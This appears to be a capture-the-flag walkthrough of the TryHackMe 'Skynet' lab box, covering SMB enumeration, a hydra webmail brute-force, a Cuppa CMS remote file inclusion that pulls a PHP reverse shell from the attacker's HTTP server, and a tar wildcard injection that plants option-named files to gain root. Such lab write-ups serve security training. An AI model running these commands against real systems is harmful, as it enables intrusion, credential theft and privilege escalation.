Skynet

Medium linux smb rfi tar-wildcard

A multi-vector Terminator-themed box that exercises nearly every OSCP-style pattern: anonymous SMB, webmail brute-force, pivoting through mail to another SMB share, a Cuppa CMS remote file inclusion, and a tar wildcard injection against a root cron. One of THM's most complete intermediate Linux rooms.

02 Anonymous SMB & password wordlist

smbclient -N -L \\\\10.10.X.X\\
Sharename       Type      Comment
---------       ----      -------
print$          Disk      Printer Drivers
anonymous       Disk      Skynet Anonymous Share
milesdyson      Disk      Miles Dyson Personal Share
IPC$            IPC       IPC Service (skynet server (Samba, Ubuntu))

anonymous is accessible with no password. milesdyson requires auth. Grab everything from anonymous:

smbclient -N \\\\10.10.X.X\\anonymous
smb: \> prompt off
smb: \> recurse on
smb: \> mget *

Contents:

attention.txt
logs/log1.txt
logs/log2.txt
logs/log3.txt

attention.txt complains about stolen passwords and staff changing them. log1.txt is the prize — a list of ~250 passwords. We'll use it as a custom wordlist.

03 SquirrelMail brute-force

Browse the web app at http://10.10.X.X/ — a Cyberdyne/Skynet themed search UI, nothing directly exploitable. Fuzz:

gobuster dir -u http://10.10.X.X/ \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -x php,txt,html -t 40

Notable hits: /squirrelmail, /admin, /config, /ai.

SquirrelMail login is at /squirrelmail/src/login.php and posts to /squirrelmail/src/redirect.php. The only local user mentioned so far is milesdyson — use it with the log1.txt wordlist:

hydra -l milesdyson -P log1.txt 10.10.X.X \
  http-post-form \
  "/squirrelmail/src/redirect.php:login_username=^USER^&secretkey=^PASS^&js_autodetect_results=1&just_logged_in=1:Unknown user or password"
If the failure string doesn't match on your instance, grab it yourself: submit a bad password from the browser, copy the exact error-page text (e.g. "Unknown user or password incorrect"), and use that as the final colon-separated field in the hydra command.

After a minute or two, hydra returns a valid password (on my instance: cyborg007haloterminator — yours may differ if the box has been reset with a new wordlist order, but it's always in log1.txt).

Log into SquirrelMail. The inbox has three emails; the second or third one contains the new SMB password for milesdyson — a long random string. Copy it exactly.

04 milesdyson SMB share

smbclient //10.10.X.X/milesdyson -U milesdyson
# password: <from email>

The share contains a mountain of research notes. The interesting ones are in notes/ — specifically important.txt, which mentions Miles's private website with a hardcoded directory name:

<snip>
1.   Add features to beta CMS /45kra24zxs28v3yd
2.   Work on T-800 Model 101 blueprints
</snip>

Visit http://10.10.X.X/45kra24zxs28v3yd/ — Miles's personal blog. Fuzz from there:

gobuster dir -u http://10.10.X.X/45kra24zxs28v3yd/ \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 40

/administrator shows up — a Cuppa CMS login. Cuppa is ancient and has a well-known RFI in alertConfigField.php.

05 Cuppa CMS RFI → shell

The vulnerable endpoint takes a URL in urlConfig and includes it without sanitisation:

http://10.10.X.X/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://<attacker>:8000/shell.php

Prepare a PHP reverse shell locally — I use pentestmonkey's, edit the IP and port at the top:

cp /usr/share/webshells/php/php-reverse-shell.php ./shell.php
sed -i 's/127.0.0.1/10.X.X.X/; s/1234/4444/' shell.php
python3 -m http.server 8000

Start a listener:

nc -lnvp 4444

Trigger the RFI:

curl "http://10.10.X.X/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://10.X.X.X:8000/shell.php"

Shell lands as www-data. Stabilise:

python3 -c 'import pty;pty.spawn("/bin/bash")'
# Ctrl-Z; stty raw -echo; fg; export TERM=xterm

We already have milesdyson's password from the email. Promote:

su milesdyson
# <password from email>
cat /home/milesdyson/user.txt

06 tar wildcard injection → root

Enumerate cron and scheduled tasks — easiest with pspy, but cat /etc/crontab works too:

cat /etc/crontab
*/1 * * * * root /home/milesdyson/backups/backup.sh

A root cron running every minute. Inspect the script:

cat /home/milesdyson/backups/backup.sh
#!/bin/bash
cd /var/www/html
tar cf /home/milesdyson/backups/backup.tgz *

Classic tar wildcard injection: the glob expansion passes any file matching * to tar as an argument, and GNU tar treats filenames starting with -- as options. Two flags let us exec a command at "checkpoint" time.

We need to write these into /var/www/html. Check permissions — on Skynet, /var/www/html is owned by www-data, so drop into the www-data shell (the original RFI shell) rather than the milesdyson session.

Prepare a payload script:

# as www-data
cd /var/www/html

cat > shell.sh <<'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootbash
chmod +s /tmp/rootbash
EOF
chmod +x shell.sh

# Create files whose names become tar arguments
touch -- "--checkpoint=1"
touch -- "--checkpoint-action=exec=sh shell.sh"

Within 60 seconds the cron fires; tar expands the wildcard, picks up the --checkpoint* files as options, and runs sh shell.sh as root. That drops a SUID copy of bash in /tmp. Confirm and escalate:

ls -la /tmp/rootbash
# -rwsr-sr-x 1 root root ... /tmp/rootbash
/tmp/rootbash -p
# id → euid=0(root)
cat /root/root.txt
If the cron doesn't seem to trigger, double-check the script content (cat /home/milesdyson/backups/backup.sh) — some Skynet revisions tweak the path or the tar invocation. Adjust the target directory to wherever the wildcard expansion actually happens.

07 Wrap-up

The chain in one sentence: anonymous SMB → wordlist for webmail brute-force → authenticated SMB share reveals hidden URL → Cuppa CMS RFI → www-data → tar wildcard injection on a root cron.

Patterns worth internalising:

  • Always list SMB shares anonymously on any box that exposes 445.
  • Weak webmail + custom dictionary = fastest path to a real user.
  • GTFOBins exists for a reason — tar, find, vim, perl as wildcard / SUID / cap targets are frequent.
  • Any wildcard in a script running as root is a red flag; options can be smuggled in as filenames.
